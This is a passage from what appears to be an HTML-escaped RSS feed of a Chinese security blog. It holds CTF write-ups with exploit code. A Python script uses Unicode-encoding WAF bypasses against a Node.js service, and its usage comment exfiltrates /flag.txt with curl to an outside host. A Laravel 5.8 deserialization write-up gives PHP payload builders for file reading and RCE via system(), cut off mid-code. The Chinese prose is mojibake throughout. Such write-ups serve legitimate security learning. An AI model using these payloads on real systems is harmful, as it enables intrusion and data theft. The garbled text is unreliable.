&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%8D%C4%8A&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A2&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A7&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;`&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A1&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%2B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%3B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;amp;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%26&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Bypass Waf&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%AF%C5%AF%C5%B4&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5&lt;/span>&lt;span style="color:#d88200">%9F&lt;/span>&lt;span style="color:#d88200">%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A5%C5%B8%C5%A5%C5%A3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payloadC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payloadRaw&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcmd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">urlC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/core?q=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payloadC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urlC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/?action=5am3_get_flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">targetUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">targetUrl&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># python exp.py http://127.0.0.1:8081 &amp;#34;curl eval.com -X POST -d `cat /flag.txt`&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>å®žä¸ç›¸çž’ï¼Œæˆ‘è¢«éƒ¨åˆ†ç¼–ç æ—¶åº”è¯¥ç¼–å“ªä¸€äº›è¿™ä¸ªé—®é¢˜å›°æ‰°äº†ä¸€å¤©ï¼Œç»åŽ†äº†næ¬¡çš„çŽ¯å¢ƒå´©æºƒå’Œå¥½å¤šå¥½å¤šä»¤äººæ— è¯­çš„æƒ…å†µï¼›å…¶å®žç”¨å…¨ç¼–ç å°±æ˜¯æœ€ç®€å•å¿«æ·çš„ï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³è‡ªå·±æŠ˜è…¾ä¸€ä¸‹&lt;/p>
&lt;p>è¿™ä¸ªç³»åˆ—ä¸‹ä¸€ç¯‡åº”è¯¥æ˜¯HTTPè¯·æ±‚èµ°ç§æˆ–è€…æ˜¯302è·³è½¬ssrfç›¸å…³çš„ï¼Œä¸è¿‡è¿‘æœŸåº”è¯¥æ˜¯ä¸ä¼šå†ç¢°jsäº†ï¼Œåžƒåœ¾Node.jsï¼Œæ¯æˆ‘é’æ˜¥&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ðŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://capec.mitre.org/data/definitions/220.html">CAPEC-220: Client-Server Protocol Manipulation&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/105.html">CAPEC-105: HTTP Request Splitting&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/33.html">CAPEC-33: HTTP Request Smuggling&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Hpd0ger/My_ctf_challenge/tree/master/Isoon2019-Membershop">Membershop - docker&lt;/a> | &lt;a href="https://github.com/nullcon/hackim-2020/tree/master/web/split_second">Split second - docker&lt;/a> | &lt;a href="https://github.com/5am3/My-CTF-Challenges/tree/master/2020-icq-gys">Node Game - docker&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501">Proxy-Proxy - wp&lt;/a> | &lt;a href="https://www.wolai.com/ctfhub/hj3e9WMu8X4ePZ3sADXfsH">Membershop - wp&lt;/a> | &lt;a href="https://ctftime.org/writeup/18293">Split second - wp1&lt;/a> | &lt;a href="https://r3billions.com/writeup-split-second/">Split second - wp2&lt;/a> | &lt;a href="https://blog.p6.is/nullcon-hackim-2020-split-second/">Split second - wp3&lt;/a> | &lt;a href="https://www.zhaoj.in/read-6462.html">Node Game - wp&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Laravel-5.8.xååºåˆ—åŒ–popé“¾å­¦ä¹ </title><link>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</link><pubDate>Sat, 04 Dec 2021 14:11:02 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</guid><description>&lt;p>äº²è‡ªä»Žå¤´åˆ°å°¾è·Ÿäº†ä¸€ä¸‹æ¶‰åŠåˆ°çš„ä¸‰ä¸ªé“¾å­ï¼Œç¨å¾®æ‹¯æ•‘äº†ä¸€ç‚¹ç‚¹ç‚¹ç‚¹æˆ‘ç¨€çƒ‚çš„ä»£ç å®¡è®¡èƒ½åŠ›&lt;/p>
&lt;p>å‚è€ƒé“¾æŽ¥æ”¾åœ¨æ–‡æœ«&lt;/p>
&lt;hr>
&lt;h2 id="é“¾å­1---æ–‡ä»¶åŒ…å«ä»»æ„æ–‡ä»¶è¯»å–">é“¾å­1 - æ–‡ä»¶åŒ…å«/ä»»æ„æ–‡ä»¶è¯»å–&lt;/h2>
&lt;p>æœç´¢&lt;code>__desturct()&lt;/code>æ‰¾å…¥æ‰‹ç‚¹ï¼Œ vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png" alt="image-20211203153626429">&lt;/p>
&lt;p>å®ƒè°ƒç”¨äº†&lt;code>commit()&lt;/code>å’Œ&lt;code>invalidateTags()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png" alt="image-20211203164858978">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png" alt="image-20211203164931565">&lt;/p>
&lt;p>è°ƒç”¨poolçš„&lt;code>saveDeferred()&lt;/code>æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªç±»ç›¸åŒå‘½åç©ºé—´(Symfony\Component\Cache\Adapter)ä¸‹æ‰¾æœ‰æ²¡æœ‰åˆ«çš„ç±»ä¹Ÿå®žçŽ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¦å¤–å¼€å§‹çš„é‚£ä¸ªpoolæ˜¯åœ¨AdapteræŽ¥å£ä¸‹ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªAdapterInterfaceæŽ¥å£å¹¶ä¸”å­˜åœ¨&lt;code>saveDeferred()&lt;/code>çš„ç±»&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png" alt="image-20211203165435637">&lt;/p>
&lt;p>æ‰¾åˆ°è¿™é‡Œvendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png" alt="image-20211203165151335">&lt;/p>
&lt;p>å®ƒåˆè°ƒç”¨äº†initialize()ï¼Œè·Ÿè¿› vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png" alt="image-20211203165212155">&lt;/p>
&lt;p>æ˜¯æˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«ç‚¹äº†ï¼Œå¯ä»¥ä»Žè¿™é‡Œè¯»flag&lt;/p>
&lt;p>æŽ¥ä¸‹æ¥å°±æ˜¯æž„é€ expäº†ï¼Œè¦æ³¨æ„å‘½åç©ºé—´å’ŒæŽ¥å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png" alt="image-20211203170050397">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png" alt="image-20211203170036701">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
&lt;p>å‰ä¸¤ä¸ªç±»éƒ½æ˜¯Symfony\Component\Cache\Adapterå‘½åç©ºé—´ä¸‹çš„ï¼Œä½†æ˜¯CacheItemæ˜¯Symfony\Component\Cacheä¸‹çš„ï¼Œæ‰€ä»¥è¦å†å¼•å…¥å®ƒï¼Œuse&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="é“¾å­2---rce">é“¾å­2 - rce&lt;/h2>
&lt;p>å›žåˆ°å‰é¢åœ¨ç›¸åŒå‘½åç©ºé—´ä¸‹æ‰¾&lt;code>saveDeferred()&lt;/code>çš„åœ°æ–¹ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªç±»ä¹Ÿæœ‰åŒæ ·çš„æ–¹æ³• vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
&lt;p>è·Ÿè¿›&lt;code>doSave()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png" alt="image-20211204102953831">&lt;/p>
&lt;p>223è¡Œå¯ä»¥åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œ&lt;code>setInnerItem&lt;/code>å¯æŽ§ æˆ‘ä»¬å¯ä»¥è°ƒç”¨&lt;code>system()&lt;/code>ï¼ŒæŽ¥ä¸‹æ¥ç¡®è®¤å®ƒè°ƒç”¨çš„ä¸¤ä¸ªå‚æ•°å¯ä¸å¯æŽ§&lt;/p>
&lt;p>å¯¹äºŽ&lt;code>$item&lt;/code>ï¼Œæ˜¯è°ƒç”¨å‡½æ•°&lt;code>doSave()&lt;/code>å‡½æ•°æ—¶ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯&lt;code>saveDeferred()&lt;/code>æ—¶çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„ï¼Œå¯æŽ§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png" alt="image-20211204103425511">&lt;/p>
&lt;p>å¯¹äºŽ&lt;code>$innerItem&lt;/code>æœ‰è¿™æ ·ä¸€ä¸ªifåˆ¤æ–­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png" alt="image-20211204103829313">&lt;/p>
&lt;p>å…‰çœ‹è¿™ä¸ªåˆ¤æ–­è‚¥è‚ çš„çªå…€ï¼Œè¿˜è¦ç»“åˆ207è¡Œçš„&lt;code>$item = (array) $item;&lt;/code>ï¼Œå®ƒå°†ä¸€ä¸ªç±»å¼ºè¡Œè½¬æ¢æˆæ•°ç»„ï¼Œè€ŒåŽé¢è·Ÿç€çš„è¿™ä¸ªifåˆ¤æ–­å°±æ˜¯ä¸ºäº†è§£å†³ç±»ä¸­åŽŸæœ‰çš„ &lt;em>protected&lt;/em>çš„å±žæ€§å†²çªï¼Œæ‰€ä»¥éœ€è¦åœ¨ç›¸åŒçš„å‘½åç©ºé—´é‡ŒæŽ¥ç€æ‰¾ä¸€ä¸ªç±»ï¼ŒåŒ…å«&lt;code>pollHash&lt;/code>å’Œ&lt;code>innerItem&lt;/code>å±žæ€§ï¼Œæœ€ç»ˆè¿˜æ˜¯æ‰¾åˆ°äº†CacheItemï¼ˆå‰é¢ä¹Ÿæ˜¯å®ƒ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
&lt;p>æž„é€ exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
